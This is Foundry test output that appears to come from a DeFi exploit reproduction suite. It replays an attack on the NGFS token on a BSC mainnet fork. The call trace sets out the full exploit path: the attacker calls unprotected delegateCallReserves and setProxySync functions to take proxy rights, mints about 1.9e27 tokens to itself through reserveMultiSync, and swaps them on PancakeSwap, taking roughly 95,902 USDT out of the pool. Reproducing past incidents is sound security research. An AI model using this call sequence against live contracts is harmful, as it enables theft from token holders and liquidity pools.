Compiling 22 files with Solc 0.8.28
Solc 0.8.28 finished in 996.52ms
Compiler run successful!

Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 23756)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [7939] ExploitScript::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 1234567 [1.234e6])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [23756] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return]
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.62s (4.02ms CPU time)

Ran 1 test for src/test/2024-04/NGFS_exp.sol:NGFS
[PASS] testExploit() (gas: 211651)
Logs:
  Attacker USDT Balance Before exploit: 26.542161622221038197
  Attacker USDT Balance After exploit: 95902.277184099168468661

Traces:
  [3523] NGFS::setUp()
    ├─ [0] VM::createSelectFork("bsc", 38167372 [3.816e7])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [234351] NGFS::testExploit()
    ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(NGFS: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 26542161622221038197 [2.654e19]
    ├─ emit log_named_decimal_uint(key: "Attacker USDT Balance Before exploit", val: 26542161622221038197 [2.654e19], decimals: 18)
    ├─ [2676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(0xa608985f5b40CDf6862bEC775207f84280a91E3A, 0x55d398326f99059fF775485246999027B3197955)
    │   └─ ← [Return] 0x687756C50f6B3172E29DF21C2537c37086b679A5
    ├─ [27554] 0xa608985f5b40CDf6862bEC775207f84280a91E3A::delegateCallReserves()
    │   ├─  storage changes:
    │   │   @ 10: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   @ 32: 65536 → 65537
    │   └─ ← [Stop]
    ├─ [49234] 0xa608985f5b40CDf6862bEC775207f84280a91E3A::setProxySync(NGFS: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   ├─  storage changes:
    │   │   @ 13: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   @ 0x429557ab0e22d751cb6c51b096800e43eeca46056658def80d550e8b02992f9e: 0 → 1
    │   └─ ← [Stop]
    ├─ [2625] 0xa608985f5b40CDf6862bEC775207f84280a91E3A::balanceOf(0x687756C50f6B3172E29DF21C2537c37086b679A5) [staticcall]
    │   └─ ← [Return] 1919552117750677378921846213 [1.919e27]
    ├─ [23342] 0xa608985f5b40CDf6862bEC775207f84280a91E3A::reserveMultiSync(NGFS: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1919552117750677378921846213 [1.919e27])
    │   ├─  storage changes:
    │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0 → 0x00000000000000000000000000000000000000000633d0f8d02f4d26b842d5c5
    │   └─ ← [Stop]
    ├─ [625] 0xa608985f5b40CDf6862bEC775207f84280a91E3A::balanceOf(NGFS: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 1919552117750677378921846213 [1.919e27]
    ├─ [24685] 0xa608985f5b40CDf6862bEC775207f84280a91E3A::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(param0: NGFS: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 0x10ED43C718714eb63d5aA57B78B54704E256024E, param2: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─  storage changes:
    │   │   @ 0x40efe119f1031eb281b5b195ed42e00327d441da2528f3ffaa1e7fa89579fa7f: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   └─ ← [Return] true
    ├─ [76174] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(1919552117750677378921846213 [1.919e27], 0, [0xa608985f5b40CDf6862bEC775207f84280a91E3A, 0x55d398326f99059fF775485246999027B3197955], NGFS: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1714043885 [1.714e9])
    │   ├─ [16563] 0xa608985f5b40CDf6862bEC775207f84280a91E3A::transferFrom(NGFS: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x687756C50f6B3172E29DF21C2537c37086b679A5, 1919552117750677378921846213 [1.919e27])
    │   │   ├─ emit Transfer(param0: NGFS: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 0x687756C50f6B3172E29DF21C2537c37086b679A5, param2: 1919552117750677378921846213 [1.919e27])
    │   │   ├─  storage changes:
    │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x00000000000000000000000000000000000000000633d0f8d02f4d26b842d5c5 → 0
    │   │   │   @ 0xa2c2ba48363d2c1c51babf6e3b513f11d1736cb0ee39469897bad127dd1006e9: 0x00000000000000000000000000000000000000000633d0f8d02f4d26b842d5c5 → 0x00000000000000000000000000000000000000000c67a1f1a05e9a4d7085ab8a
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(NGFS: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 26542161622221038197 [2.654e19]
    │   ├─ [2893] 0x687756C50f6B3172E29DF21C2537c37086b679A5::getReserves() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000028aac68615dc81edbcc600000000000000000000000000000000000000000633d0f8d02f4d26b842d5c500000000000000000000000000000000000000000000000000000000662a2795
    │   ├─ [625] 0xa608985f5b40CDf6862bEC775207f84280a91E3A::balanceOf(0x687756C50f6B3172E29DF21C2537c37086b679A5) [staticcall]
    │   │   └─ ← [Return] 3839104235501354757843692426 [3.839e27]
    │   ├─ [45339] 0x687756C50f6B3172E29DF21C2537c37086b679A5::swap(95902277184099168468661 [9.59e22], 0, NGFS: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [10871] 0x55d398326f99059fF775485246999027B3197955::transfer(NGFS: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 95902277184099168468661 [9.59e22])
    │   │   │   ├─ emit Transfer(param0: 0x687756C50f6B3172E29DF21C2537c37086b679A5, param1: NGFS: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 95902277184099168468661 [9.59e22])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0xa2c2ba48363d2c1c51babf6e3b513f11d1736cb0ee39469897bad127dd1006e9: 0x0000000000000000000000000000000000000000000028aac68615dc81edbcc6 → 0x00000000000000000000000000000000000000000000145be7121af6e1e2fe11
    │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x0000000000000000000000000000000000000000000000017058b35e777da275 → 0x0000000000000000000000000000000000000000000014504fccae441788612a
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x687756C50f6B3172E29DF21C2537c37086b679A5) [staticcall]
    │   │   │   └─ ← [Return] 96142633768520469642769 [9.614e22]
    │   │   ├─ [625] 0xa608985f5b40CDf6862bEC775207f84280a91E3A::balanceOf(0x687756C50f6B3172E29DF21C2537c37086b679A5) [staticcall]
    │   │   │   └─ ← [Return] 3839104235501354757843692426 [3.839e27]
    │   │   ├─ emit Sync(: 96142633768520469642769 [9.614e22], : 3839104235501354757843692426 [3.839e27])
    │   │   ├─ emit Swap(param0: 0x10ED43C718714eb63d5aA57B78B54704E256024E, param1: 0, param2: 1919552117750677378921846213 [1.919e27], param3: 95902277184099168468661 [9.59e22], param4: 0, param5: NGFS: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   ├─  storage changes:
    │   │   │   @ 10: 0x0000000000000000000000000000000000003cfaaddb2de3f9491400e13ef380 → 0x000000000000000000000000000000000000c24a1b6ec0b9c2b66af1fb5f8253
    │   │   │   @ 9: 0x0000000000000000000000000000016b76da028a31bd507d305de851e04bf70d → 0x000000000000000000000000000004855032cf673aba2f5a92f8ac3ac38ebfb9
    │   │   │   @ 8: 0x662a279500000633d0f8d02f4d26b842d5c50000000028aac68615dc81edbcc6 → 0x662a3bea00000c67a1f1a05e9a4d7085ab8a00000000145be7121af6e1e2fe11
    │   │   └─ ← [Stop]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(NGFS: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 95928819345721389506858 [9.592e22]
    │   └─ ← [Stop]
    ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(NGFS: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 95928819345721389506858 [9.592e22]
    ├─ emit log_named_decimal_uint(key: "Attacker USDT Balance After exploit", val: 95902277184099168468661 [9.59e22], decimals: 18)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 16.87s (13.44s CPU time)

Ran 2 test suites in 18.03s (18.49s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
